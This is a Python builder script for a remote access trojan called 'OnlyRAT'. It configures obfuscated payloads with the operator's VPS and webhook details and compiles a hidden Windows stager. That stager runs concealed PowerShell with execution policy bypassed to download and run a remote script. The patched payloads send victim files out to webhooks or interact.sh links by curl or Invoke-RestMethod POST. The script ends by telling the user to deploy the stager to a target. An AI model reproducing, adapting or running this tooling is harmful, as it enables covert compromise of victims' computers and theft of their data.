import os
import sys
import subprocess

def get_input(prompt, default=""):
    try:
        val = input(f"{prompt} [{default}]: ").strip()
        return val if val else default
    except EOFError:
        return default

def patch_file(filepath, replacements):
    if not os.path.exists(filepath):
        print(f"[!] Warning: {filepath} not found.")
        return

    with open(filepath, 'r') as f:
        content = f.read()

    for old, new in replacements.items():
        content = content.replace(old, new)

    with open(filepath, 'w') as f:
        f.write(content)
    print(f"[+] Patched {filepath}")

def main():
    print("==============================")
    print("   OnlyRAT Advanced Builder   ")
    print("==============================")
    print("This script configures payloads and compiles a Windows EXE stager.\n")

    base_dir = "."

    mode = get_input("Connection Mode (local/vps)", "vps").lower()

    exfil_method = get_input("Exfiltration Method (webhook/interactsh)", "webhook").lower()
    exfil_url = get_input("Enter Webhook URL or interact.sh link", "https://interact.sh/...")

    if mode == "vps":
        vps_ip = get_input("VPS IP Address", "1.2.3.4")
        vps_user = get_input("VPS Username", "root")
        vps_port = get_input("VPS SSH Port", "22")
        vps_forward_port = get_input("VPS Forwarded Port (for RAT connection)", "2583")

        # Patch from-vps.cmd
        patch_file(f"{base_dir}/installers/from-vps.cmd", {
            'set "EcSjRhAguo=X.X.X.X"': f'set "EcSjRhAguo={vps_ip}"'
        })
        # Patch payloads/v1.cmd
        patch_file(f"{base_dir}/payloads/v1.cmd", {
            'set "EcSjRhAguo=X.X.X.X"': f'set "EcSjRhAguo={vps_ip}"'
        })
        # Patch payloads/v2.ps1
        replacements = {
            '$nkowFESgaO = "USERNAME"': f'$nkowFESgaO = "{vps_user}"',
            '$ecPlmJVLRo = "X.X.X.X"': f'$ecPlmJVLRo = "{vps_ip}"',
            '$ENyMAhIrsb = "22"': f'$ENyMAhIrsb = "{vps_port}"',
            '$YlEQgBmePn = "2583"': f'$YlEQgBmePn = "{vps_forward_port}"'
        }

        # Adding interact.sh support to v2.ps1 exfiltration
        if exfil_method == "interactsh":
            # Original: scp -P $ENyMAhIrsb -o StrictHostKeyChecking=no -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
            # We add a curl exfil as well.
            replacements['Remove-Item $CRYnrkaDbe'] = f'Invoke-RestMethod -Uri "{exfil_url}" -Method Post -InFile $CRYnrkaDbe; Remove-Item $CRYnrkaDbe'

        patch_file(f"{base_dir}/payloads/v2.ps1", replacements)

    else:
        # Local mode
        patch_file(f"{base_dir}/installers/from-github.cmd", {
            "DISCORDWEBHOOK": exfil_url
        })

        # Patch g2.ps1 for interact.sh or custom webhook
        if exfil_method == "interactsh":
             patch_file(f"{base_dir}/payloads/g2.ps1", {
                'curl.exe -F "payload_json={\\\"username\\\": \\\"onlyrat\\\", \\\"content\\\": \\\"download me\\\"}" -F "file=@$env:username.rat" $PEBgxuJUfd': f'curl.exe -X POST -T "$env:username.rat" {exfil_url}'
             })
        else:
             # If it's a generic webhook that isn't Discord, it might fail with original Discord flags
             # But we'll leave it as is unless specified.
             pass

    print("\n[+] Payloads configured successfully.")

    compile_exe = get_input("Do you want to compile an EXE stager? (y/n)", "y").lower()
    if compile_exe == "y":
        target_url = ""
        if mode == "vps":
            # For VPS mode, the stager should download the v1.cmd from the VPS
            target_url = f"http://{vps_ip}/v1.cmd"
        else:
            # For Local mode, it downloads from Github
            target_url = "https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd"

        stager_url = get_input("Confirm Stager Download URL", target_url)

        c_code = f"""
#include <windows.h>
#include <stdio.h>

int main() {{
    // Hide console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"$url='{stager_url}'; $file='%TEMP%\\\\stager.cmd'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process $file -WindowStyle Hidden\\\"");

    system(cmd);
    return 0;
}}
"""
        with open("stager.c", "w") as f:
            f.write(c_code)

        print("[*] Compiling stager.exe using x86_64-w64-mingw32-gcc...")
        try:
            subprocess.run(["x86_64-w64-mingw32-gcc", "stager.c", "-o", "stager.exe", "-mwindows"], check=True)
            print("[+] stager.exe created successfully!")
        except Exception as e:
            print(f"[!] Compilation failed: {e}")
            print("[!] Ensure mingw-w64 is installed: sudo apt install mingw-w64")

    print("\n[***] All done! [***]")
    if mode == "vps":
        print(f"Next steps: Upload the contents of {base_dir}/payloads/ to your VPS web root.")
    print("Deploy stager.exe or the .cmd files in installers/ to your target.")

if __name__ == "__main__":
    main()
